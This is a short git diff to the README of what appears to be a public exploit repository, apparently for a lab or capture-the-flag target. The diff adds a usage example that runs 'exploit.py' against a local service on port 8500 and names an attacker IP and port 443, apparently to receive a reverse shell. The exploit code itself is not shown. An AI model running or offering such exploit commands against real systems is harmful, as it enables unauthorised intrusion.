@@ -11,7 +11,10 @@
 <img src="https://raw.githubusercontent.com/GatoGamer1155/imagenes-repositorios/main/exploit1.png">
 
 
-· If we have what is necessary, we can give it the arguments and run it.
+· If we have what is necessary, we can give it the arguments and run it, example:
+
+    python3 exploit.py 127.0.0.1 8500 10.10.14.29 443 bb03b43b-1d81-d62b-24b5-39540ee469b5
+
 
 · When executing the script with its arguments we should see a message with a + which indicates that the request has been sent correctly
 
